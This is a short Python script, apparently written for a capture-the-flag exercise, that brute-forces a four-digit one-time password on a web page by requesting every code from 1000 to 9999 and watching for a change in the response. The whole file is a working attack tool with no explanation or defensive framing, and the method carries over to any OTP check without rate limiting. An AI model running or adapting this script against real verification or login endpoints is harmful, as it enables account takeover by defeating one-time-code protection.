import requests
from bs4 import BeautifulSoup

response = requests.get("http://ctf.segfaulthub.com:1129/6/checkOTP.php?otpNum=1")
soup = BeautifulSoup(response.content, 'html.parser')
compare = soup.find('script')

def website(url):
  try:
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    judge = soup.find('script')
    if judge != compare:
      return True
    
  except requests.exceptions.RequestException as e:
    return False

for i in range(1000,10000):
  a = "{:0>4}".format(i)
  url = "http://ctf.segfaulthub.com:1129/6/checkOTP.php?otpNum=" + str(a)
  print(f'Trying to input {i}')
  if website(url):
    print(f"{i} is true")
    break

print('end')